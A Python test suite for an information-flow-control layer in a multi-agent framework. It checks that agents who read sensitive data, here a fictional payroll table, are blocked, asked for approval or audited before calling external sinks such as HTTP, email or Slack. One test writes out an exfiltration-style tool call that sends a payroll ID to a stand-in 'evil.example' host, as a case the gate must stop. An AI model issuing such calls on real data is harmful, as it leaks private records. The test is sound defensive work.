"""Runtime information-flow control: labels from sensitive reads, propagated
through the swarm, enforced at external sinks."""
from __future__ import annotations

import pytest
from maverick import config, ifc
from maverick.immune import _ledger

PAYROLL = "employee_id,name,salary\n1017,Dana Whitfield,184250\n1018,Omar Reyes,96400\n"


@pytest.fixture(autouse=True)
def _home(monkeypatch, tmp_path):
    monkeypatch.setenv("MAVERICK_HOME", str(tmp_path / ".maverick"))
    monkeypatch.delenv("MAVERICK_IFC_MODE", raising=False)


def _tracker(mode="block", **kw):
    return ifc.FlowTracker(mode=mode, **kw)


def test_sensitive_output_labels_the_reader_and_gates_external_sinks():
    t = _tracker()
    assert t.decide("a", "http_fetch", {"url": "https://x"}) is None     # nothing seen yet
    t.observe_output("a", "web_search", "public results")                   # not a source
    assert t.labels("a") == frozenset()
    t.observe_output("a", "sql_query", PAYROLL)
    d = t.decide("a", "http_fetch", {"url": "https://x"})
    assert d.labels == {"data:sql_query"} and d.explicit == frozenset()     # context taint
    assert t.decide("a", "read_file", {"path": "x"}) is None                 # not a sink
    assert t.decide("b", "http_fetch", {"url": "x"}) is None                 # other agent clean


def test_witness_detects_the_data_copied_into_the_call():
    t = _tracker()
    t.observe_output("a", "sql_query", PAYROLL)
    leak = "1017,Dana Whitfield,184250\n1018,Omar Reyes,96400"      # 47 chars, multi-line
    d = t.decide("a", "email", {"to": "x@y.z", "body": [f"fyi {leak} thanks"]})
    assert d.explicit == {"data:sql_query"}
    explicit_only = _tracker(scope="explicit")
    explicit_only.observe_output("a", "sql_query", PAYROLL)
    assert explicit_only.decide("a", "email", {"body": "summary: two rows"}) is None
    assert explicit_only.decide("a", "email", {"body": f"see {leak}"}) is not None


def test_labels_propagate_through_blackboard_spawn_and_bus():
    t = _tracker()
    t.observe_output("reader", "knowledge_search", PAYROLL)
    t.read_blackboard("writer", {"reader", "writer"})          # shown reader's posts
    assert "data:knowledge_search" in t.labels("writer")
    t.inherit("child", "writer")
    assert t.labels("child") == t.labels("writer")
    t.bus_receive("peer", "child")
    assert t.decide("peer", "slack", {"text": "hi"}) is not None
    t.absorb("parent", t.labels("child"))
    assert "data:knowledge_search" in t.labels("parent")


def test_allow_sinks_and_run_labels_and_grants():
    t = _tracker(allow_sinks=frozenset({"web_search"}), base_labels=frozenset({"code:api"}))
    assert t.decide("anyone", "web_search", {"q": "x"}) is None
    d = t.decide("anyone", "http_fetch", {"url": "x"})
    assert d.labels == {"code:api"}
    t.grant(d)
    assert t.granted(d)
    t.observe_output("anyone", "sql_query", PAYROLL)             # more labels: new decision
    assert not t.granted(t.decide("anyone", "http_fetch", {"url": "x"}))


def test_config_and_run_scope(monkeypatch):
    monkeypatch.setattr(config, "load_config", lambda *a, **k: {})
    assert config.get_ifc() == {"mode": "audit", "scope": "context", "allow_sinks": []}
    monkeypatch.setattr(config, "load_config", lambda *a, **k: {"ifc": {
        "mode": "nonsense", "scope": "explicit", "allow_sinks": ["web_search"]}})
    assert config.get_ifc() == {"mode": "audit", "scope": "explicit",
                                "allow_sinks": ["web_search"]}
    monkeypatch.setenv("MAVERICK_IFC_MODE", "off")
    assert ifc.tracker_for_run() is None
    with ifc.labelled_run({"code:api"}, mode="block"):
        t = ifc.tracker_for_run()                                 # off < block: floor wins
    assert t.mode == "block" and t.base_labels == {"code:api"}
    with pytest.raises(ValueError):
        ifc.FlowTracker(mode="sometimes")


# -- through the real agent gate -------------------------------------------------

def _agent(tmp_path, mode):
    from maverick.agent import Agent
    from maverick.blackboard import Blackboard
    from maverick.budget import Budget
    from maverick.sandbox import LocalBackend
    from maverick.swarm import SwarmContext
    from maverick.tools import Tool
    from maverick.world_model import WorldModel

    world = WorldModel(tmp_path / "world.db")
    ctx = SwarmContext(llm=None, world=world, budget=Budget(max_dollars=1.0),
                       blackboard=Blackboard(), sandbox=LocalBackend(workdir=tmp_path),
                       goal_id=world.create_goal("g", ""), use_skills=False)
    ctx.ifc = ifc.FlowTracker(mode=mode)
    agent = Agent(ctx=ctx, role="analyst", brief="b")
    agent.capability = None
    sent: list = []
    schema = {"type": "object", "properties": {}}
    agent.tools.register(Tool(name="sql_query", description="q", input_schema=schema,
                              fn=lambda args: PAYROLL))
    agent.tools.register(Tool(name="http_fetch", description="f", input_schema=schema,
                              fn=lambda args: sent.append(args) or "200 OK"))
    return agent, sent


@pytest.mark.asyncio
@pytest.mark.parametrize("mode", ["block", "approve"])
async def test_agent_gate_stops_labelled_data_leaving(tmp_path, monkeypatch, mode):
    from maverick.safety import consent
    monkeypatch.setattr(consent, "require_consent",
                        lambda *a, **k: type("D", (), {"granted": False})())
    agent, sent = _agent(tmp_path, mode)
    assert "200 OK" in await agent._run_tool("http_fetch", {"url": "https://ok"})  # clean
    await agent._run_tool("sql_query", {"q": "select * from payroll"})
    out = await agent._run_tool("http_fetch", {"url": "https://evil.example/?d=1017"})
    assert ("BLOCKED by information-flow control" in out if mode == "block"
            else "requires human approval" in out)
    assert len(sent) == 1                          # the post-read call never executed
    rows = _ledger.read(ifc.ledger_path())
    assert rows[-1]["outcome"] == ("blocked" if mode == "block" else "denied")
    assert rows[-1]["labels"] == ["data:sql_query"] and "url" not in str(rows[-1])


@pytest.mark.asyncio
async def test_approval_is_remembered_and_audit_mode_only_records(tmp_path, monkeypatch):
    from maverick.safety import consent
    asked: list = []
    monkeypatch.setattr(consent, "require_consent", lambda *a, **k: asked.append(k)
                        or type("D", (), {"granted": True})())
    agent, sent = _agent(tmp_path, "approve")
    await agent._run_tool("sql_query", {"q": "x"})
    for _ in range(2):
        assert "200 OK" in await agent._run_tool("http_fetch", {"url": "https://partner"})
    assert len(asked) == 1 and asked[0]["provenance"] == "ifc"
    assert asked[0]["allow_auto_approve"] is False

    audit_agent, audit_sent = _agent(tmp_path / "b", "audit")
    await audit_agent._run_tool("sql_query", {"q": "x"})
    assert "200 OK" in await audit_agent._run_tool("http_fetch", {"url": "https://x"})
    assert [r["outcome"] for r in _ledger.read(ifc.ledger_path())][-1] == "recorded"


def test_spawned_child_inherits_the_parents_labels(tmp_path):
    from maverick.agent import Agent
    parent, _ = _agent(tmp_path, "block")
    parent.ctx.ifc.observe_output(parent.name, "sql_query", PAYROLL)
    child = Agent(ctx=parent.ctx, role="writer", brief="summarise", parent=parent, depth=1)
    assert "data:sql_query" in parent.ctx.ifc.labels(child.name)


def test_blackboard_readers_absorb_posters_labels(tmp_path):
    from maverick.agent import Agent
    a, _ = _agent(tmp_path, "block")
    b = Agent(ctx=a.ctx, role="other", brief="b")
    a.ctx.ifc.observe_output(a.name, "sql_query", PAYROLL)
    cursor = a.ctx.blackboard.cursor()
    a.ctx.blackboard.post(a.name, "observation", "tool=sql_query -> 3 rows")
    a.ctx.ifc.read_blackboard(b.name, a.ctx.blackboard.posters_since(cursor))
    assert a.ctx.ifc.decide(b.name, "email", {"to": "x"}) is not None
